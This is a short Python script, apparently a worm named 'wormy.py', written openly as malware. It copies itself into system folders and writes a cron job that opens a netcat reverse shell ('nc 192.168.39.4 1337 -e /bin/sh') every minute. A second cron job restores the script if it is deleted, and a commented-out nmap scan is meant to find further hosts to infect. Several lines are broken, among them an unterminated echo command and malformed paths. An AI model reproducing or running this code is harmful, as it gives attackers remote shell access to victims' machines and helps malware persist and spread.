#!/usr/bin/env python3

import sys
from sys import argv
import os
import shutil
#import nmap


def cloning():
#replication
	script = argv
	name = str(script[0])
	directory = "gravlax"
#for if the clone dir already exists

	if os.path.exists(directory):
		os.system(r'rm -r ' + directory)

	#replication 
	



	os.mkdir(directory)
	os.system(r"cp " + name + " " + directory)
	os.system(r"cp " + name + " /usr/bin")
	os.system(r"cp " + name + " ~/home")



#need some way to establish persistence on the victim

#sets up a cron job to create a reverse shell into the victim machine
def shell():
	
	os.system(r'echo "* * * * * nc 192.168.39.4 1337 -e /bin/sh" > cron')
	os.system(r'echo "* * * * * /usr/bin/python ')
	os.system(r'crontab -i cron')
	os.system(r'rm cron')

#need a way to spread throughout the system and create more persistence

def cron_replicate():
	
	#adds cron job to run the program that allows it to repopulate if deleted

	os.system(r'echo "30 * * * * /usr/bin/python usr/bin/wormy.py" > cron2')
	os.system(r'crontab -i cron2')
	os.system(r'rm cron2')

#scan ports to infect other hosts

#def port_scanner():
	#nm = nmap.PortScanner()
	#nm.scan('198.168.39.0/24', '22')


#main function
def main():
	
		cloning()
		shell()
		cron_replicate()




if __name__ == "__main__":
	main()